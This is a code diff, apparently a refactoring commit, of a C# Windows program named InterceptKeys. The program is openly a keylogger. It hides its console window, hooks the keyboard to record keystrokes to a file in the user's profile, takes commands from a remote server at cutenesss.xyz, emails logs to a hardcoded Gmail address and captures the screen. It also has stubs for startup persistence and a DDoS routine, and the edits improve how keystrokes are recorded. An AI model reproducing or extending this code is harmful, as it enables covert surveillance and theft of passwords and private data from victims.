@@ -19,9 +19,13 @@ namespace Karios
 {
     class InterceptKeys
     {
+        // ReSharper disable once InconsistentNaming
         private const int WH_KEYBOARD_LL = 13;
+
+        // ReSharper disable once InconsistentNaming
         private const int WM_KEYDOWN = 0x0100;
-        private static LowLevelKeyboardProc _proc = HookCallback;
+
+        private static readonly LowLevelKeyboardProc Proc = HookCallback;
         private static IntPtr _hookId = IntPtr.Zero;
         private static string _localIp;
         private static string _globalTargetIp;
@@ -49,7 +53,7 @@ namespace Karios
                 // Start Application
                 var handle = GetConsoleWindow();
                 ShowWindow(handle, SwHide);
-                _hookId = SetHook(_proc);
+                _hookId = SetHook(Proc);
                 Application.Run();
                 UnhookWindowsHookEx(_hookId);
             }
@@ -57,27 +61,11 @@ namespace Karios
             Console.ReadKey();
         }
 
-        public static void RunApplication()
-        {
-            // Hide the window
-
-
-            // Persitance feature
-            // Duplicate(); 
-
-            // Run on startup 
-            // SetStartup();
-            // Start Application
-
-            //Application.Run();
-            //UnhookWindowsHookEx(_hookID);
-        }
-
         private static void CommandGet()
         {
             try
             {
-                var serverAddress = "http://cutenesss.xyz/server.php";
+                const string serverAddress = "http://cutenesss.xyz/server.php";
 
                 var client = new WebClient();
 
@@ -85,6 +73,7 @@ namespace Karios
 
 
                 //In future versions, this hash will be secret and enforced - Makes sure everyone is running latest client
+                //TODO - Make hash secret and enforced
                 var getIterations = -1;
                 var target = "";
                 var loop = true; // So we can break the loop
@@ -210,7 +199,7 @@ namespace Karios
                     }
                     else
                     {
-                        //Online = false;
+                        //_online = false;
                     }
 
                     _emailEndpoint = preppedCommand[4];
@@ -242,14 +231,18 @@ namespace Karios
             var appName = AppDomain.CurrentDomain.FriendlyName;
             var vkCode = Marshal.ReadInt32(lParam);
             var fileName = DateTime.Now.ToString("yyyy-MM-dd");
-            // StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
             var pathToLog = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" +
                             fileName + ".txt"; // TODO - get more secret location.
             var sw = new StreamWriter(pathToLog, true);
-            if ((Keys)vkCode != Keys.Space && (Keys)vkCode != Keys.Enter)
+            if ((Keys)vkCode != Keys.Enter)
             {
-                sw.Write(((Keys)vkCode).ToString().ToLower());
-                Console.Write(((Keys)vkCode).ToString().ToLower());
+                if ((Keys)vkCode == Keys.Space)
+                    sw.Write(" ");
+                else
+                {
+                    sw.Write(((Keys)vkCode).ToString());
+                    Console.Write(((Keys)vkCode).ToString());
+                }
             }
             else
             {
@@ -263,12 +256,14 @@ namespace Karios
             try
             {
                 var mail = new MailMessage();
-                var smtpServer = new SmtpClient("smtp.gmail.com"); // VSCode is suggesting another library, "MimeKit" - should be on GitHub if you want to check it out at https://github.com/jstedfast/MimeKit. It may need us to rewrite some code if we do implement it though -- STBoyden
+                var smtpServer = new SmtpClient("smtp.gmail.com");
                 mail.From = new MailAddress("GINGIRULES@gmail.com");
 
                 mail.To.Add(_emailEndpoint);
-                mail.Subject = "log from keylogger on" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-                mail.Body = "New log file from Computer (" + GetLocalIp(_localIp) + " , finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
+                mail.Subject = "log from keylogger on" +
+                               Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+                mail.Body = "New log file from Computer (" + GetLocalIp(_localIp) + " , finshed at: " +
+                            DateTime.Now.ToString("yyyy-MM-dd");
 
                 mail.To.Add("GINGIRULES@gmail.com");
                 mail.Subject = "log from keylogger on" +
@@ -288,10 +283,7 @@ namespace Karios
             }
             catch
             {
-
                 // ignored
-
-
             }
 
             //System.IO.File.Copy(path, Application.StartupPath + @"\log.txt", true);
@@ -313,16 +305,9 @@ namespace Karios
         }
 
 
-
         /// <summary>
         /// Sets the startup registary key
         /// </summary>
-
-
-        /// <summary>
-        /// Sets the startup registary key
-        /// </summary>
-
         public static void SetStartup()
         {
             /*
@@ -371,62 +356,58 @@ namespace Karios
             {
                 try
                 {
-
                     Process.Start(_website);
                 }
                 catch
                 {
                     // ignored
                 }
-
             }
-
         }
 
-    public static void Ddos()
-    {
-        using (var wc = new WebClient())
+        public static void Ddos()
         {
-            try
+            using (var wc = new WebClient())
             {
-            }
-            catch
-            {
-
+                try
+                {
+                }
+                catch
+                {
+                }
             }
         }
+
+        private static Image CaptureDesktop()
+        {
+            var rectangle = Screen.PrimaryScreen.Bounds;
+            var bitmap = new Bitmap(rectangle.Width, rectangle.Height, PixelFormat.Format32bppArgb);
+            var graphics = Graphics.FromImage(bitmap);
+            graphics.CopyFromScreen(rectangle.X, rectangle.Y, 0, 0, rectangle.Size, CopyPixelOperation.SourceCopy);
+            return bitmap;
+        }
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook,
+            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+            IntPtr wParam, IntPtr lParam);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        private const int SwHide = 0;
     }
-
-    private static Image CaptureDesktop()
-    {
-        var rectangle = Screen.PrimaryScreen.Bounds;
-        var bitmap = new Bitmap(rectangle.Width, rectangle.Height, PixelFormat.Format32bppArgb);
-        var graphics = Graphics.FromImage(bitmap);
-        graphics.CopyFromScreen(rectangle.X, rectangle.Y, 0, 0, rectangle.Size, CopyPixelOperation.SourceCopy);
-        return bitmap;
-    }
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr SetWindowsHookEx(int idHook,
-        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
-        IntPtr wParam, IntPtr lParam);
-
-    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr GetModuleHandle(string lpModuleName);
-
-    [DllImport("kernel32.dll")]
-    static extern IntPtr GetConsoleWindow();
-
-    [DllImport("user32.dll")]
-    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
-    private const int SwHide = 0;
-}
 }
